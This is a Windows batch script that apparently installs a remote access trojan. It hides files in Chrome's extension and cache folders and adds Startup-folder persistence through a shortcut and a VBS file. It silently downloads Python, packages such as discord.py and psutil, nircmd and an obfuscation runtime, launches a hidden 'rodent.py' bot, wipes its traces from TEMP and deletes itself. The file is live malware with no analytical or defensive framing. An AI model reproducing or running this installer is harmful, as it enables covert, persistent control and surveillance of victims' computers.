@echo off
SETLOCAL EnableDelayedExpansion
del /Y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\mrrooomhhqrqrggarakrkuxxerrttattht"
mkdir "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\mrrooomhhqrqrggarakrkuxxerrttattht"
copy /Y "pcClient.bat" "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\mrrooomhhqrqrggarakrkuxxerrttattht"
powershell -WindowStyle Hidden -Command "Start-Process 'setupLaunchMethod.bat' -WindowStyle Hidden"
:waitforrhfile
if exist "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\mrrooomhhqrqrggarakrkuxxerrttattht\pcClient.exe.lnk" goto foundthtfile
timeout /t 1 /nobreak >nul
goto waitforrhfile
:foundthtfile
copy /Y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\mrrooomhhqrqrggarakrkuxxerrttattht\pcClient.exe.lnk" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
copy /Y "httpsService.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
copy /Y "readme.txt" "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\mrrooomhhqrqrggarakrkuxxerrttattht"
SET PYTHON_VER=3.13.1
SET PYTHON_ZIP=python-%PYTHON_VER%-embed-amd64.zip
SET PYTHON_URL=https://www.python.org/ftp/python/%PYTHON_VER%/%PYTHON_ZIP%
SET PYTHON_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache\Cache_Data\Cached
SET GET_PIP_URL=https://bootstrap.pypa.io/get-pip.py
SET GET_PIP_FILE=%TEMP%\get-pip.py
SET "NIRCMD_URL=https://www.nirsoft.net/utils/nircmd.zip"
SET "RUNTIME_URL=https://github.com/claxee/universalrbx/raw/refs/heads/main/pyarmor_runtime_000000.zip"
SET "RUNTIME_ZIP=%TEMP%\pyarmor_runtime.zip"
SET "NIRCMD_ZIP=%TEMP%\packd_nircmd.zip"
SET "SOURCE_BOT=rodent.py"
SET "SOURCE_LAUNCHER=launcher.bat"
if not exist "%PYTHON_DIR%" mkdir "%PYTHON_DIR%"
if not exist "%PYTHON_DIR%\python.exe" (
    powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%PYTHON_URL%' -OutFile '%TEMP%\%PYTHON_ZIP%'"
    powershell -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%TEMP%\%PYTHON_ZIP%' -DestinationPath '%PYTHON_DIR%' -Force"
    del "%TEMP%\%PYTHON_ZIP%"
)
for %%f in ("%PYTHON_DIR%\python3*.zip") do set "ZIP_NAME=%%~nf"
set "PTH_FILE=%PYTHON_DIR%\%ZIP_NAME%._pth"
(
    echo %ZIP_NAME%.zip
    echo .
    echo Lib\site-packages
    echo.
    echo import site
) > "%PTH_FILE%"
if not exist "%PYTHON_DIR%\Lib\site-packages" mkdir "%PYTHON_DIR%\Lib\site-packages"
if not exist "%GET_PIP_FILE%" (
    powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%GET_PIP_URL%' -OutFile '%GET_PIP_FILE%'"
)
"%PYTHON_DIR%\python.exe" "%GET_PIP_FILE%" --no-warn-script-location
"%PYTHON_DIR%\python.exe" -m pip install discord.py certifi pillow psutil
powershell -Command "Invoke-WebRequest -Uri '%NIRCMD_URL%' -OutFile '%NIRCMD_ZIP%'"
powershell -Command "Expand-Archive -Path '%NIRCMD_ZIP%' -DestinationPath '%PYTHON_DIR%' -Force"
del "%NIRCMD_ZIP%"
powershell -Command "Invoke-WebRequest -Uri '%RUNTIME_URL%' -OutFile '%RUNTIME_ZIP%'"
powershell -Command "Expand-Archive -Path '%RUNTIME_ZIP%' -DestinationPath '%PYTHON_DIR%' -Force"
del "%RUNTIME_ZIP%"
if exist "%SOURCE_BOT%" copy /Y "%SOURCE_BOT%" "%PYTHON_DIR%\"
if exist "%SOURCE_LAUNCHER%" copy /Y "%SOURCE_LAUNCHER%" "%PYTHON_DIR%\"
if exist "finishSetup.py" copy /Y "finishSetup.py" "%PYTHON_DIR%\"
set "tempDir=%TEMP%"
if exist "%tempDir%\launcher.bat" del /f /q "%tempDir%\launcher.bat"
if exist "%tempDir%\rodent.py" del /f /q "%tempDir%\rodent.py"
if exist "%tempDir%\RtkAudUService64.exe" del /f /q "%tempDir%\RtkAudUService64.exe"
if exist "%tempDir%\installrodents.bat" del /f /q "%tempDir%\installrodents.bat"
if exist "%tempDir%\pcClient.exe.lnk" del /f /q "%tempDir%\pcClient.exe.lnk"
if exist "%tempDir%\pcClient.bat" del /f /q "%tempDir%\pcClient.bat"
if exist "%tempDir%\scheduletask.bat" del /f /q "%tempDir%\scheduletask.bat"
if exist "%tempDir%\readme.txt" del /f /q "%tempDir%\readme.txt"
if exist "%tempDir%\setupLaunchMethod.bat" del /f /q "%tempDir%\setupLaunchMethod.bat"
if exist "%tempDir%\httpsService.vbs" del /f /q "%tempDir%\httpsService.vbs"
if exist "%GET_PIP_FILE%" del /f /q "%GET_PIP_FILE%"
cd %PYTHON_DIR%
SET "INST_DIR=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache\Cache_Data\Cached"
SET "PY_EXE=%INST_DIR%\python.exe"
SET "SUP_SCRIPT=%INST_DIR%\finishSetup.py"
"%PY_EXE%" "%SUP_SCRIPT%"
powershell -WindowStyle Hidden -Command "Start-Process 'launcher.bat' -WindowStyle Hidden"
if exist "%tempDir%\finishSetup.py" del /f /q "%tempDir%\finishSetup.py"
if exist "%PYTHON_DIR%\finishSetup.py" del /f /q "%PYTHON_DIR%\finishSetup.py"
timeout 1
cd %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache\Cache_Data\Cached
powershell -WindowStyle Hidden -Command "Start-Process 'launcher.bat' -WindowStyle Hidden"
echo %~dp0 | findstr /i /c:"%TEMP%" >nul
if %errorlevel%==0 (
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c del \"%~f0\"' -WindowStyle Hidden"&exit /b
)